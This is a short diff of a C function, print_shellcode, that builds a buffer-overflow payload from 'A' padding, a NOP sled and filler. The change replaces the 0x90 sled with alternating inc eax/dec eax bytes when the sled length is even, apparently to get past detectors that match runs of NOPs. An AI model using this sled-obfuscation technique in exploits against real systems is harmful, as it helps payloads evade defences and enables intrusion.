@@ -185,8 +185,15 @@ int print_shellcode()
 	/* prepare output buffer */
 	for(i=0;i<A;i++)
 		output[i] = 'A';
-	for(i=0;i<N;i++)
-		output[i+A] = '\x90';
+	if (N%2) {
+		for(i=0;i<N;i++)
+			output[i+A] = '\x90';
+	} else {
+		for(i=0;i<N;i+=2) {
+			output[i+A]   = '\x40'; // inc eax
+			output[i+A+1] = '\x48'; // dec eax
+		}
+	}
 	for(++E,i=0,j='A';i<E;i++,j++) {
 		if (j=='\n'||j=='\r')
 			j++;
